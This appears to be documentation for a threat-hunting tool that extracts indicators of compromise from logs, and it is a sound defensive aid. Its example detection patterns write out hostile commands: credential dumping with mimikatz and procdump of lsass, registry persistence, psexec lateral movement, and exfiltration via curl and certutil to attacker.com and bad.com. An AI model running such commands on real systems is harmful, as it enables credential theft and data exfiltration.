# 🎯 IOC EXTRACTION REFERENCE - Complete Coverage

## **✅ ALL EXTRACTED IOC TYPES (10 Types)**

The threat hunting system extracts **10 different IOC types** across all tables:

---

## **📊 COMPLETE IOC TYPE LIST:**

| # | Type | Pattern/Source | Example | Boost |
|---|------|----------------|---------|-------|
| 1 | **IP Address** | IPv4 regex | `79.76.123.251` | 1x |
| 2 | **IPv6 Address** | IPv6 regex | `2607:fea8::1` | 1x |
| 3 | **File Hash (MD5)** | 32-char hex | `5d41402abc4b2a76b9719d911017c592` | 5x |
| 4 | **File Hash (SHA256)** | 64-char hex | `abc123def...` | 5x |
| 5 | **Domain** | FQDN regex | `malicious.com` | 1x |
| 6 | **Email** | Email regex | `attacker@bad.com` | 1x |
| 7 | **URL** | HTTP/HTTPS | `http://exfil.com/data` | 3x |
| 8 | **Base64** | Base64 pattern | `UG93ZXJTaGVs...` | 2x |
| 9 | **ProcessCommandLine** | From logs (filtered) | `powershell -enc [data]` | **4x** |
| 10 | **Parent Command** | InitiatingProcess | `cmd.exe /c whoami` | **4x** |
| 11 | **Account Name** | From CSV | `slflare` | 1x |
| 12 | **Device Name** | From CSV | `slflarewinsysmo` | 1x |

**Boost** = Relevance multiplier (higher = prioritized in results)

---

## **🔥 COMMAND LINE EXTRACTION (NEW!)**

### **ProcessCommandLine Detection:**

The system extracts command lines that contain **suspicious patterns**:

#### **Encoding/Obfuscation:**
```powershell
powershell.exe -encodedCommand UG93ZXJTaGVs...
powershell.exe -e [base64]
Invoke-Expression [System.Convert]::FromBase64String(...)
```

#### **Credential Access:**
```powershell
mimikatz.exe sekurlsa::logonpasswords
procdump.exe -ma lsass.exe lsass.dmp
reg save HKLM\SAM sam.save
```

#### **Persistence:**
```cmd
schtasks /create /tn "Backdoor" /tr malware.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v evil
```

#### **Lateral Movement:**
```cmd
psexec.exe \\server-01 -u admin cmd.exe
wmic /node:server-01 process call create "cmd.exe"
net use \\server-01\c$ /user:admin password
```

#### **Exfiltration:**
```powershell
Compress-Archive -Path C:\Data -DestinationPath exfil.zip
curl http://attacker.com/exfil -Method POST -Body $data
certutil -urlcache -f http://bad.com/data.txt
```

#### **CTF Patterns:**
```bash
echo "flag{this_is_the_answer}" > output.txt
cat /root/flag.txt
grep -r "flag{" /var/log/
```

---

## **🎯 FILTERING LOGIC:**

### **Commands Are Extracted If:**

1. ✅ **Contains suspicious keywords** (50+ patterns)
2. ✅ **Very long** (>200 characters - often obfuscated)
3. ✅ **High special char density** (>10 special chars - potential encoding)
4. ✅ **Contains CTF keywords** (`flag{`, `ctf`, `decode`, `hidden`)

### **Commands Are Ignored If:**

1. ❌ Too short (<10 characters)
2. ❌ Empty or null
3. ❌ Common benign processes (filtered during ranking)

---

## **💡 WHY COMMAND LINES ARE CRITICAL FOR CTF:**

### **1. Direct Flag Storage:**
```bash
# Flag directly in command
echo "flag{admin_192.168.1.1_1234}" > /tmp/flag.txt

# Captured as:
IOC Type: command
Value: echo "flag{admin_192.168.1.1_1234}" > /tmp/flag.txt
```

### **2. Encoded Flags:**
```powershell
# Base64 encoded flag
powershell.exe -enc ZmxhZ3thZG1pbl8xOTIuMTY4LjEuMV8xMjM0fQ==

# Captured as:
IOC Type: command
Value: powershell.exe -enc ZmxhZ3...
```

### **3. Attack Chain Visibility:**
```
Parent Command: cmd.exe /c powershell.exe
Child Command: powershell.exe -enc [malicious]

Shows full attack chain!
```

### **4. IOC Correlation:**
```
Command: curl http://79.76.123.251/data.txt
Network: Connection to 79.76.123.251

Correlates command with network activity!
```

---

## **📊 IOC SCORING SYSTEM:**

| IOC Type | Base Score | Multiplier | Final Priority |
|----------|------------|------------|----------------|
| File Hash | Event count | x5 | **Highest** |
| Command Lines | Event count | x4 | **Very High** |
| URLs | Event count | x3 | High |
| Base64 | Event count | x2 | Medium |
| IPs, Accounts | Event count | x1 | Normal |

**Plus:** If IOC appears in investigation context → **x10 boost!**

---

## **🎯 COMMAND LINE BEST PRACTICES:**

### **1. Look for Encoding:**
Commands with `-enc`, `-e`, `base64` often hide malicious code or flags

### **2. Check Parent Process:**
`InitiatingProcessCommandLine` shows how the suspicious process was launched

### **3. Correlate with Network:**
If command has URL/IP, check network events to that destination

### **4. Decode Everything:**
The LLM will attempt to decode base64, hex, and other encodings found in commands

---

## **✅ READY TO USE:**

The IOC extraction system is **fully functional**!

**Try it:**
```bash
python3 _main.py
# Select [1] Threat Hunting
# Select query method and table
# Provide investigation context if needed
# Review all extracted IOCs including IPs, hashes, domains, commands, etc.
```

**All IOC types are automatically extracted and analyzed!** 🎯

